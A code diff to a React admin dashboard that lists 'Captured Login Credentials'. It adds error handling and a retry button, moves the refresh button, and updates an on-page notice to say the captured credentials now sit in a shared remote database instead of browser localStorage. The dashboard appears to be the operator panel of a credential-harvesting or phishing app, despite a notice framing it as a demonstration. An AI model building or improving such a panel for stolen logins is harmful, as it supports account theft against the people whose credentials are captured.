@@ -17,6 +17,7 @@ import { formatDistanceToNow } from 'date-fns';
 const AdminDashboard = () => {
   const [credentials, setCredentials] = useState<Credential[]>([]);
   const [isLoading, setIsLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -26,16 +27,19 @@ const AdminDashboard = () => {
   const loadCredentials = async () => {
     try {
       setIsLoading(true);
+      setError(null);
       const result = await getLoginCredentials();
       
       if (result.success) {
         setCredentials(result.data);
       } else {
+        setError('Failed to load credentials');
         toast.error('Failed to load credentials');
       }
     } catch (error) {
       console.error('Error loading credentials:', error);
-      toast.error('Something went wrong');
+      setError('Something went wrong. Network error or service unavailable.');
+      toast.error('Something went wrong. Check your network connection.');
     } finally {
       setIsLoading(false);
     }
@@ -61,11 +65,25 @@ const AdminDashboard = () => {
         </div>
         
         <div className="bg-gray-900 rounded-lg p-6 mb-8">
-          <h2 className="text-xl font-semibold mb-4">Captured Login Credentials</h2>
+          <div className="flex justify-between items-center mb-4">
+            <h2 className="text-xl font-semibold">Captured Login Credentials</h2>
+            <div className="flex items-center">
+              <Button onClick={loadCredentials} variant="outline" size="sm" className="ml-2">
+                Refresh Data
+              </Button>
+            </div>
+          </div>
           
           {isLoading ? (
             <div className="text-center py-8">
               <p>Loading credentials...</p>
+            </div>
+          ) : error ? (
+            <div className="text-center py-8 text-red-400">
+              <p>{error}</p>
+              <Button onClick={loadCredentials} variant="outline" className="mt-4">
+                Try Again
+              </Button>
             </div>
           ) : credentials.length === 0 ? (
             <div className="text-center py-8">
@@ -93,12 +111,6 @@ const AdminDashboard = () => {
               </Table>
             </div>
           )}
-          
-          <div className="mt-4 flex justify-end">
-            <Button onClick={loadCredentials} variant="outline">
-              Refresh Data
-            </Button>
-          </div>
         </div>
         
         <div className="bg-red-900/30 border border-red-800 rounded-lg p-6">
@@ -108,13 +120,14 @@ const AdminDashboard = () => {
             you should implement proper security measures.
           </p>
           <p>
-            The credentials are stored in browser localStorage. In a real application, you would need to:
+            The credentials are now stored in a shared remote database. In a real application, you would need to:
           </p>
           <ul className="list-disc list-inside mt-2 space-y-1 text-gray-300">
             <li>Set up a proper MongoDB instance on a secure server</li>
             <li>Use environment variables for the connection string</li>
             <li>Implement proper authentication and authorization</li>
             <li>Set up secure API endpoints for data fetching</li>
+            <li>Encrypt sensitive data before storing</li>
           </ul>
         </div>
       </div>
